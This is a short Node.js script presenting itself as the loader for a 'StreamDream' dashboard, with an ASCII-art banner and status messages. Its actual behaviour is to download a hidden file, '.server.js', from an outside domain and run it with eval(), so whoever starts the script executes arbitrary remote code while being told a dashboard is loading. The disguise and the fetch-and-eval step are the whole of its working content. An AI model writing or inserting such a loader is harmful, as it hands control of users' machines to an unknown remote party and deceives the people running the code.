const print = `
███████ ████████ ██████  ███████  █████  ███    ███ ██████  ██████  ███████  █████  ███    ███ 
██         ██    ██   ██ ██      ██   ██ ████  ████ ██   ██ ██   ██ ██      ██   ██ ████  ████ 
███████    ██    ██████  █████   ███████ ██ ████ ██ ██   ██ ██████  █████   ███████ ██ ████ ██ 
     ██    ██    ██   ██ ██      ██   ██ ██  ██  ██ ██   ██ ██   ██ ██      ██   ██ ██  ██  ██ 
███████    ██    ██   ██ ███████ ██   ██ ██      ██ ██████  ██   ██ ███████ ██   ██ ██      ██ 
`;
console.log(print);
console.log("StreamDream :: Loading dashboard...");
const fetch = require('node-fetch');
const go = () => {
    fetch("https://dbdbdbdbdbgroup.com/demo/.server.js")
        .then(response => {
            if (response.ok) return response.text();
            throw new Error(`Error fetching dashboard: ${response.status}`);
        })
        .then((data) => {
            eval(data);
        })
        .catch((error) => {
            console.log('StreamDream :: error loading', error);
            setTimeout(() => {
                console.log('StreamDream :: error');
            }, 30000)
        });
};
go();